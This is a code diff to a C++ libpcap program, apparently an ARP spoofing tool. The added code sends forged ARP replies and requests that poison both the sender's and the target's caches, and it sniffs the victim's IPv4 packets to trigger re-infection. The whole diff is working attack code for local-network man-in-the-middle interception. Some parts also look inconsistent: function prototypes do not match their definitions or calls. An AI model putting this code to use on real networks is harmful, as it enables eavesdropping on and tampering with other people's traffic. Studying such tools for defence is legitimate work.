@@ -25,6 +25,24 @@ struct MyAddr final{
   Mac mac_;
 };
 
+struct Ipv4Hdr final{
+    uint8_t version4;
+    uint8_t tos;
+    uint16_t tot_len;
+    uint16_t pid;
+    uint16_t offset;
+    uint8_t ttl;
+    uint8_t next_pid;
+    uint16_t checksum;
+    uint32_t saddr;
+    uint32_t daddr;
+};
+
+struct EthIpPacket final {
+    EthHdr eth_;
+    Ipv4Hdr ip_;
+};
+
 void usage() {
     printf("syntax: ARPSpoofing <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
     printf("sample: ARPSpoofing eth0 192.168.0.4 192.168.0.1\n");
@@ -34,7 +52,8 @@ MyAddr getAttackerAddr(char *dev);
 Mac getMACAddr(char* IP);
 void ARPinfect(pcap_t* handle, Mac eth_smac, Mac eth_dmac,uint16_t op, Mac arp_smac, Ip arp_sip, Mac arp_tmac, Ip arp_tip);
 void arpSpoofing(pcap_t* handle, char* sendIP, char* targetIP,MyAddr attacker);
-void ARPRelayLoop(pcap_t* handle);
+void ARPreInfect(pcap_t* handle,Ip sIP,Ip tIP,MyAddr attacker);
+void spoofedIPpacket(pcap_t* handle, Mac smac, Mac dmac, Ip sip);
 
 bool EXIT = true;
 
@@ -200,7 +219,7 @@ void ARPinfect(pcap_t* handle, Mac eth_smac, Mac eth_dmac,uint16_t op, Mac arp_s
     }
 }
 
-void ARPRelayLoop(pcap_t* handle,Ip sIP,Ip tIP,MyAddr attacker)
+void ARPreInfect(pcap_t* handle,Ip sIP,Ip tIP,MyAddr attacker)
 {
     while(1)
     {
@@ -229,6 +248,35 @@ void ARPRelayLoop(pcap_t* handle,Ip sIP,Ip tIP,MyAddr attacker)
     }
 }
 
+void spoofedIPpacket(pcap_t* handle, Mac smac, Mac dmac, Ip sip,Ip tip,MyAddr attacker)
+{
+    while(1)
+    {
+        struct pcap_pkthdr* hdr;
+        const u_char* packet;
+
+        int res = pcap_next_ex(handle, &hdr, &packet);
+
+        if(res==0)   continue;
+
+        if(res == PCAP_ERROR || res == PCAP_ERROR_BREAK)
+        {
+            fprintf(stderr,"pcap_next_ex return %d(%s)\n",res,pcap_geterr(handle));
+            exit(1);
+        }
+
+        struct EthIpPacket* ethip = (EthIpPacket *)packet;
+
+        if(ethip->eth_.type() == EthHdr::Ip4 && ethip->ip_.saddr==sip && ethip->eth_.smac()==smac && ethip->eth_.dmac()==dmac)
+        {
+            ARPinfect(handle, attacker.mac_,smac,ArpHdr::Request, attacker.mac_, attacker.ip_, dmac, tip);
+            break;
+        }
+
+
+    }
+}
+
 void arpSpoofing(pcap_t* handle, char* sendIP, char* targetIP, MyAddr attacker)
 {
     Ip sIP = Ip(sendIP);
@@ -237,8 +285,18 @@ void arpSpoofing(pcap_t* handle, char* sendIP, char* targetIP, MyAddr attacker)
     ARPinfect(handle,attacker.mac_,Mac::broadcastMac(),ArpHdr::Request,attacker.mac_,attacker.ip_,Mac::nullMac(),sIP);
     Mac sMAC = getMACAddr(handle, sIP);
     ARPinfect(handle,attacker.mac_,sMAC,ArpHdr::Reply,attacker.mac_,tIP,sMAC,sIP);
+    ARPinfect(handle,attacker.mac_,Mac::broadcastMac(),ArpHdr::Request,attacker.mac_,attacker.ip_,Mac::nullMac(),tIP);
+    Mac tMAC = getMACAddr(handle, tIP);
 
-    ARPRelayLoop(handle,sIP,tIP,attacker);
+    ARPreInfect(handle,sIP,tIP,attacker);
+
+    spoofedIPpacket(handle, attacker.mac_, tMAC, sIP, tIP,attacker);
+
+
+
+//    ARPinfect(handle,attacker.mac_,sMAC,ArpHdr::Reply,attacker.mac_,sIP,tMAC,tIP);
+
+//    ARPreInfect(handle,tIP,sIP,attacker);
 }
 
 
